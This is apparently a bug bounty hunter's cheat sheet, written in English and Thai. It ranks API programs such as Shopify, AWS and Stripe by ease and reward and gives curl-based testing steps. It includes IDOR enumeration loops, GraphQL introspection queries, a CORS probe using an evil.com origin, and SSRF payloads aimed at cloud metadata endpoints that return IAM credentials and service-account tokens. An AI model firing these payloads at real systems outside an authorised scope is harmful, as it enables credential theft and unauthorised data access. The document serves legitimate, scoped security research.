# 🎯 API Bug Bounty Hunting Targets - June 2026
# Easy to test, high reward potential

---

## 🚀 Quick Start - ลำดับความง่ายในการทดสอบ

### Tier 1: Easiest (เริ่มจากตรงนี้!)

| # | Program | Platform | API Type | Auth | What to Test | Ease | Notes |
|---|---------|----------|----------|------|--------------|------|-------|
| 1 | **Shopify** | HackerOne | GraphQL | API Key | IDOR in billing/orders | 10/10 | ✅ Report ready |
| 2 | **GitLab** | HackerOne | GraphQL/REST | JWT/Token | IDOR in Model Registry | 9/10 | ✅ Report ready |
| 3 | **Uber** | HackerOne | REST | Bearer | IDOR in trip/receipt access | 8/10 | ✅ Report ready |
| 4 | **Stripe** | HackerOne | REST | API Key | Sandbox testing available | 8/10 | ⚠️ Need Stripe account |
| 5 | **Cloudflare** | HackerOne | REST | API Key | SSRF in workers/proxy | 7/10 | ✅ Report ready |

### Tier 2: Medium Difficulty

| # | Program | Platform | API Type | Auth | What to Test | Ease |
|---|---------|----------|----------|------|--------------|------|
| 6 | **Coinbase** | HackerOne | REST | API Key | CORS, IDOR in accounts | 7/10 |
| 7 | **AWS** | HackerOne | REST | IAM Role | SSRF to metadata | 6/10 |
| 8 | **GCP** | Bugcrowd | REST | Service Account | SSRF to metadata | 6/10 |
| 9 | **PayPal** | HackerOne | REST | OAuth | IDOR in payment APIs | 7/10 |
| 10 | **Square** | HackerOne | REST | Access Token | IDOR in orders/inventory | 7/10 |

### Tier 3: More Challenging (แต่รางวัลสูงกว่า)

| # | Program | Platform | API Type | Auth | What to Test | Ease |
|---|---------|----------|----------|------|--------------|------|
| 11 | **Okta** | HackerOne | OAuth/OIDC | - | Auth bypass, SSO flaws | 5/10 |
| 12 | **Auth0** | HackerOne | OAuth | - | Token manipulation | 5/10 |
| 13 | **Atlassian** | Bugcrowd | REST/GraphQL | API Token | IDOR in projects/boards | 6/10 |
| 14 | **New Relic** | Bugcrowd | GraphQL (NerdGraph) | API Key | Auth bypass in queries | 6/10 |
| 15 | **Twilio** | HackerOne | REST | API Key | IDOR in accounts/calls | 6/10 |

---

## ⚠️ IMPORTANT: Before Testing ANY Target

1. **Check HackerOne/Bugcrowd Scope First!**
   - Go to the program's page on HackerOne/Bugcrowd
   - Read the Scope section carefully
   - Only test assets listed as IN SCOPE

2. **Verify API Access**
   - Some APIs require partner/developer registration
   - Stripe requires being a Stripe user
   - DoorDash requires partner access (NOT public)

3. **Use Test Accounts**
   - Always test with your own account first
   - Verify you get YOUR data before trying others'
   - Add delays between requests to avoid rate limits:
   ```bash
   sleep 1  # Add delay to avoid rate limiting
   ```

---

## 📋 Testing Methodology by Vulnerability Type

### 1. IDOR Testing (ง่ายที่สุด!)

```bash
# Step 1: Get your own data first
curl -X GET 'https://api.target.com/v1/user/ME' \\
  -H 'Authorization: Bearer YOUR_TOKEN'

# Step 2: Enumerate other IDs
for id in 100 101 102 103; do
  curl -X GET "https://api.target.com/v1/user/$id" \\
    -H 'Authorization: Bearer YOUR_TOKEN'
done

# IDOR = Different data returned for different IDs!
```

### 2. GraphQL BOLA Testing

```bash
# Step 1: Introspection (if enabled)
curl -X POST 'https://api.target.com/graphql' \\
  -H 'Authorization: Bearer YOUR_TOKEN' \\
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# Step 2: Try accessing other users' objects
curl -X POST 'https://api.target.com/graphql' \\
  -H 'Authorization: Bearer YOUR_TOKEN' \\
  -d '{"query":"query { user(id: \"TARGET_ID\") { name email } }"}'

# BOLA = Returns data for users you don't own!
```

### 3. SSRF Testing (Cloud Providers)

```bash
# Test for metadata access
curl 'https://api.target.com/fetch?url=http://169.254.169.254/latest/meta-data/'

# Test internal services
curl 'https://api.target.com/fetch?url=http://localhost:8080/'
curl 'https://api.target.com/fetch?url=http://127.0.0.1:6379/'

# SSRF = You can access internal services!
```

### 4. CORS Misconfiguration Testing

```bash
# Check for reflected Origin
curl -X OPTIONS 'https://api.target.com/v1/user' \\
  -H 'Origin: https://evil.com' \\
  -H 'Access-Control-Request-Method: GET'

# Vulnerable if response includes:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

---

## 🎯 Specific Endpoints to Test

### Shopify (Already have report - submit first!)
```bash
# GraphQL endpoint
POST https://shop.myshopify.com/admin/api/2024-01/graphql.json
Header: X-Shopify-Access-Token: YOUR_TOKEN

# Test IDOR in:
# - /billing_invoices
# - /orders
# - /customers
```

### Stripe (Great for beginners - sandbox mode!)
```bash
# Test mode API
curl https://api.stripe.com/v1/customers/CUST_ID \\
  -u sk_test_...

# Test IDOR in:
# - /customers/{id}
# - /charges/{id}
# - /payment_intents/{id}
```

### AWS (High reward for SSRF)
```bash
# EC2 metadata (if vulnerable)
http://TARGET.com/fetch?url=http://169.254.169.254/latest/meta-data/

# Lambda metadata
http://TARGET.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# S3 bucket access
http://TARGET.com/fetch?url=http://s3.amazonaws.com/
```

### GCP Cloud Run (SSRF)
```bash
# Metadata service
http://TARGET.com/fetch?url=http://metadata.google.internal/

# Service account tokens
http://TARGET.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

---

## 🛠️ Tools บน Kali ของคุณ

```bash
# 1. ติดตั้งเครื่องมือ
pip3 install playwright   # Browser automation
apt install burpsuite     # Web proxy (if available)
apt install nmap          # Port scanning

# 2. ใช้ Burp Suite Community สำหรับ API testing
# Proxy traffic จาก browser/app

# 3. ใช้ ffuf สำหรับ API discovery
ffuf -w wordlist.txt -u https://api.target.com/FUZZ

# 4. ใช้ nuclei สำหรับ known vulnerabilities
nuclei -t api-cves.yaml -u https://api.target.com
```

---

## 📊 Reward Ranges (USD)

| Vulnerability | Low | Medium | High | Critical |
|--------------|-----|--------|------|----------|
| IDOR | $100 | $500 | $2,000 | $5,000+ |
| SSRF | $500 | $2,000 | $5,000 | $10,000+ |
| CORS | $100 | $300 | $500 | $1,000 |
| GraphQL BOLA | $300 | $1,000 | $3,000 | $7,500 |
| OAuth Bypass | $500 | $2,000 | $5,000 | $25,000 |

---

## ✅ Next Steps

1. **Submit existing reports** (Shopify #4, GitLab #6, Uber #3)
2. **Create Stripe account** at stripe.com for sandbox testing
3. **Test AWS SSRF** on any target with URL fetching feature
4. **Map GraphQL** of programs using introspection

---

## 📚 References

- OWASP API Security Top 10: https://owasp.org/www-project-api-security/
- HackerOne Discovery: https://hackerone.com/opportunities/all
- Bugcrowd Programs: https://bugcrowd.com/programs
- PortSwigger Web Security Academy: https://portswigger.net/web-security